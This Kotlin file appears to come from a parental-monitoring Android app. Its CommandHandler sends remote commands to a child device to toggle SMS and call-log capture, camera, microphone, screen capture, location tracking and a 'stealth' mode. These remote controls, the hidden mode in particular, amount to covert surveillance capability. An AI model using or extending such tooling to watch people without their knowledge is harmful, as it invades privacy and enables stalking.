package com.soumo.parentandroid

import android.util.Log
import com.soumo.parentandroid.webrtc.ParentPeerManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.launchIn
import kotlinx.coroutines.flow.onEach

/**
 * CommandHandler centralizes sending commands to the child and handling responses.
 * It wraps the DataChannel exposed by ParentPeerManager.
 */
class CommandHandler(
    private val peer: ParentPeerManager,
    private val scope: CoroutineScope,
) {
    private val logTag = "CommandHandler"

    private var eventsJob: Job? = null

    fun startListening(onEvent: (String) -> Unit) {
        eventsJob?.cancel()
        eventsJob = peer.dataChannelEvents
            .onEach { msg ->
                Log.d(logTag, "Child -> $msg")
                onEvent(msg)
            }
            .launchIn(scope)
    }

    fun stopListening() {
        eventsJob?.cancel()
        eventsJob = null
    }

    // Basic ping
    fun pingChild(): Boolean = peer.sendCommand(AppConf.RSP_PING_CHILD)

    // Permissions
    fun checkPermissions(): Boolean = peer.sendCommand(AppConf.CMD_CHECK_PERMISSIONS)
    fun requestAllPermissions(): Boolean = peer.sendCommand(AppConf.CMD_REQUEST_ALL_PERMISSIONS)
    fun showPermissionDialog(feature: String): Boolean = peer.sendCommand("${AppConf.CMD_SHOW_PERMISSION_DIALOG}:$feature")

    // SMS
    fun smsOn(): Boolean = peer.sendCommand(AppConf.CMD_SMS_ON)
    fun smsOff(): Boolean = peer.sendCommand(AppConf.CMD_SMS_OFF)

    // Call Logs
    fun callLogOn(): Boolean = peer.sendCommand(AppConf.CMD_CALLLOG_ON)
    fun callLogOff(): Boolean = peer.sendCommand(AppConf.CMD_CALLLOG_OFF)

    // Camera
    fun cameraOn(): Boolean = peer.sendCommand(AppConf.CMD_CAMERA_ON)
    fun cameraOff(): Boolean = peer.sendCommand(AppConf.CMD_CAMERA_OFF)
    fun cameraSwitch(): Boolean = peer.sendCommand(AppConf.CMD_CAMERA_SWITCH)

    // Mic
    fun micOn(): Boolean = peer.sendCommand(AppConf.CMD_MIC_ON)
    fun micOff(): Boolean = peer.sendCommand(AppConf.CMD_MIC_OFF)

    // Screen
    fun screenOn(): Boolean = peer.sendCommand(AppConf.CMD_SCREEN_ON)
    fun screenOff(): Boolean = peer.sendCommand(AppConf.CMD_SCREEN_OFF)

    // Location
    fun locationOn(): Boolean = peer.sendCommand(AppConf.CMD_LOCATION_ON)
    fun locationOff(): Boolean = peer.sendCommand(AppConf.CMD_LOCATION_OFF)

    // Stealth
    fun stealthOn(): Boolean = peer.sendCommand(AppConf.CMD_STEALTH_ON)
    fun stealthOff(): Boolean = peer.sendCommand(AppConf.CMD_STEALTH_OFF)
}

